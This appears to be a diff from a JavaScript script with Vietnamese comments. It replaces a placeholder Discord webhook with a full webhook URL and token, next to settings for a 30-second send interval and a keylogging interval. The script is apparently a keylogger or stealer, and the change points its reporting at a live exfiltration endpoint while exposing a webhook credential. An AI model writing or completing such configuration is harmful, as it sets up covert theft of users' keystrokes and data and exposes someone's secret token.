@@ -10,7 +10,7 @@
   'use strict';
 
   // ============ CẤU HÌNH ============
-  const WEBHOOK = 'https://discord.com/api/webhooks/XXXX/YYYY'; // Thay webhook thật
+  const WEBHOOK = 'https://discord.com/api/webhooks/1559071638442479727/a52oLmvAKls6sF7QZqonSrNEXAdvljPi85OcKlQsncRFB1hsmyWK3rqHvmOPYQuoamL6'; // Thay webhook thật
   const INTERVAL = 30000;   // 30s gửi 1 lần
   const KEYLOG_INTERVAL = 15000;
 
